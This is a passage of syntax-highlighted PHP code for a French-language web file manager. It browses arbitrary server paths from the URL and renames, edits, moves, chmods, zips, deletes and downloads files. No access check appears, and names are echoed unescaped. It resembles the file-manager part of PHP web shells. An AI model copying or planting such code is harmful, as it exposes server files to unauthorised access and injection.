	<span style="color: #19177C">$scandir</span> <span style="color: #666666">=</span> <span style="color: #008000">scandir</span>(<span style="color: #19177C">$path</span>);
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;div id=&quot;content&quot;&gt;&lt;table width=&quot;700&quot; border=&quot;0&quot; cellpadding=&quot;3&quot; cellspacing=&quot;1&quot; align=&quot;center&quot;&gt;</span>
<span style="color: #BA2121">&lt;tr class=&quot;first&quot;&gt;</span>
<span style="color: #BA2121">&lt;td class=&quot;centre&quot;&gt;Nom&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=&quot;centre&quot;&gt;Taille&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=&quot;centre&quot;&gt;Permissions&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=&quot;centre&quot;&gt;Actions&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;/tr&gt;&#39;</span>;

	<span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$scandir</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$dir</span>) {
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000">is_dir</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BA2121">&quot;</span>) <span style="color: #666666">||</span> <span style="color: #19177C">$dir</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;.&#39;</span> <span style="color: #666666">||</span> <span style="color: #19177C">$dir</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;..&#39;</span>) <span style="color: #008000; font-weight: bold">continue</span>;
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;tr&gt;</span>
<span style="color: #BA2121">&lt;td&gt;&lt;a href=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">?path=</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BA2121">&lt;/a&gt;&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">petit centre</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;--&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">petit centre</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span>;
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_writable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BA2121">&quot;</span>)) <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;&#39;</span>;
		<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #666666">!</span><span style="color: #008000">is_readable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BA2121">&quot;</span>)) <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&#39;</span>;
		<span style="color: #008000; font-weight: bold">echo</span> perms(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BA2121">&quot;</span>);
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_writable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BA2121">&quot;</span>) <span style="color: #666666">||</span> <span style="color: #666666">!</span><span style="color: #008000">is_readable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BA2121">&quot;</span>)) <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/font&gt;&#39;</span>;

		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">centre</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;form method=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">POST</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> action=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">?option&amp;path=</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">opt</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">Que faire?</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Que faire?&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">rename</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Renommer&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">move</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Déplacer&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">chmod</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Chmod&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">zip</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Compresser&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">unzip</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Décompresser&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">delete</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Supprimer&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;/select&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">hidden</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">type</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">dir</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">hidden</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">name</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">hidden</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">path</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$dir</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">submit</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;/tr&gt;&quot;</span>;
	}
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;tr class=&quot;first&quot;&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span>;
	<span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$scandir</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$file</span>) {
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000">is_file</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&quot;</span>)) <span style="color: #008000; font-weight: bold">continue</span>;
		<span style="color: #19177C">$size</span> <span style="color: #666666">=</span> <span style="color: #008000">filesize</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&quot;</span>) <span style="color: #666666">/</span> <span style="color: #666666">1024</span>;
		<span style="color: #19177C">$size</span> <span style="color: #666666">=</span> round(<span style="color: #19177C">$size</span>, <span style="color: #666666">2</span>);
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$size</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">1024</span>) {
			<span style="color: #19177C">$size</span> <span style="color: #666666">=</span> round(<span style="color: #19177C">$size</span> <span style="color: #666666">/</span> <span style="color: #666666">1024</span>, <span style="color: #666666">2</span>) <span style="color: #666666">.</span> <span style="color: #BA2121">&#39; Mo&#39;</span>;
		}
		<span style="color: #008000; font-weight: bold">else</span> {
			<span style="color: #19177C">$size</span> <span style="color: #666666">=</span> <span style="color: #19177C">$size</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39; Ko&#39;</span>;
		}

		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;tr&gt;</span>
<span style="color: #BA2121">&lt;td&gt;&lt;a href=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">?filesrc=</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&amp;path=</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&lt;/a&gt;&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">petit centre</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$size</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">petit centre</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span>;
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_writable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&quot;</span>)) <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;&#39;</span>;
		<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #666666">!</span><span style="color: #008000">is_readable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&quot;</span>)) <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&#39;</span>;
		<span style="color: #008000; font-weight: bold">echo</span> perms(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&quot;</span>);
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_writable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&quot;</span>) <span style="color: #666666">||</span> <span style="color: #666666">!</span><span style="color: #008000">is_readable</span>(<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BA2121">&quot;</span>)) <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/font&gt;&#39;</span>;
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;td class=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">centre</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;form method=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">POST</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> action=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">?option&amp;path=</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">opt</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">Que faire?</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Que faire?&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">rename</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Renommer&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">edit</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Modifier&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">move</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Déplacer&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">chmod</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Chmod&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">zip</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Compresser&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">unzip</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Décompresser&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">delete</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;Supprimer&lt;/option&gt;</span>
<span style="color: #BA2121">&lt;/select&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">hidden</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">type</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">file</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">hidden</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">name</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">hidden</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">path</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BB6688; font-weight: bold">$path</span><span style="color: #BA2121">/</span><span style="color: #BB6688; font-weight: bold">$file</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">submit</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;&lt;/td&gt;</span>
<span style="color: #BA2121">&lt;/tr&gt;&quot;</span>;
	}
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/table&gt;</span>
<span style="color: #BA2121">&lt;/div&gt;&#39;</span>;
}
<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;</span>
<span style="color: #BA2121">&lt;/body&gt;</span>
<span style="color: #BA2121">&lt;/html&gt;&#39;</span>;
<span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">perms</span>(<span style="color: #19177C">$file</span>) {
	<span style="color: #19177C">$perms</span> <span style="color: #666666">=</span> <span style="color: #008000">fileperms</span>(<span style="color: #19177C">$file</span>);

	<span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0xC000</span>) <span style="color: #666666">==</span> <span style="color: #666666">0xC000</span>) {
		<span style="color: #408080; font-style: italic">// Socket</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;s&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0xA000</span>) <span style="color: #666666">==</span> <span style="color: #666666">0xA000</span>) {
		<span style="color: #408080; font-style: italic">// Symbolic Link</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;l&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x8000</span>) <span style="color: #666666">==</span> <span style="color: #666666">0x8000</span>) {
		<span style="color: #408080; font-style: italic">// Regular</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;-&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x6000</span>) <span style="color: #666666">==</span> <span style="color: #666666">0x6000</span>) {
		<span style="color: #408080; font-style: italic">// Block special</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;b&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x4000</span>) <span style="color: #666666">==</span> <span style="color: #666666">0x4000</span>) {
		<span style="color: #408080; font-style: italic">// Directory</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;d&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x2000</span>) <span style="color: #666666">==</span> <span style="color: #666666">0x2000</span>) {
		<span style="color: #408080; font-style: italic">// Character special</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;c&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x1000</span>) <span style="color: #666666">==</span> <span style="color: #666666">0x1000</span>) {
		<span style="color: #408080; font-style: italic">// FIFO pipe</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;p&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">else</span> {
		<span style="color: #408080; font-style: italic">// Unknown</span>
		<span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;u&#39;</span>;
	}

	<span style="color: #408080; font-style: italic">// Owner</span>
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0100</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;r&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>);
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0080</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;w&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>);
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0040</span>) <span style="color: #666666">?</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0800</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;s&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;x&#39;</span>) <span style="color: #666666">:</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0800</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;S&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>));

	<span style="color: #408080; font-style: italic">// Group</span>
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0020</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;r&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>);
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0010</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;w&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>);
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0008</span>) <span style="color: #666666">?</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0400</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;s&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;x&#39;</span>) <span style="color: #666666">:</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0400</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;S&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>));

	<span style="color: #408080; font-style: italic">// World</span>
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0004</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;r&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>);
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0002</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;w&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>);
	<span style="color: #19177C">$info</span> <span style="color: #666666">.=</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0001</span>) <span style="color: #666666">?</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0200</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;t&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;x&#39;</span>) <span style="color: #666666">:</span> ((<span style="color: #19177C">$perms</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0x0200</span>) <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;T&#39;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;-&#39;</span>));

	<span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$info</span>;
}
<span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">telFichBin</span>(<span style="color: #19177C">$telfich</span>){
	header(<span style="color: #BA2121">&#39;Content-Description: File Transfer&#39;</span>);
	header(<span style="color: #BA2121">&#39;Content-Type: application/octet-stream&#39;</span>);
	header(<span style="color: #BA2121">&#39;Content-Disposition: attachment; filename=&quot;&#39;</span><span style="color: #666666">.</span><span style="color: #008000">basename</span>(<span style="color: #19177C">$telfich</span>)<span style="color: #666666">.</span><span style="color: #BA2121">&#39;&quot;&#39;</span>);
	header(<span style="color: #BA2121">&#39;Expires: 0&#39;</span>);
	header(<span style="color: #BA2121">&#39;Cache-Control: must-revalidate&#39;</span>);
	header(<span style="color: #BA2121">&#39;Pragma: public&#39;</span>);
	header(<span style="color: #BA2121">&#39;Content-Length: &#39;</span> <span style="color: #666666">.</span> <span style="color: #008000">filesize</span>(<span style="color: #19177C">$telfich</span>));
	<span style="color: #008000">ob_clean</span>();
	<span style="color: #008000">flush</span>();
	<span style="color: #008000">readfile</span>(<span style="color: #19177C">$telfich</span>);
	<span style="color: #008000; font-weight: bold">exit</span>;
}
<span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">cheminWeb</span>(<span style="color: #19177C">$fich</span>) {
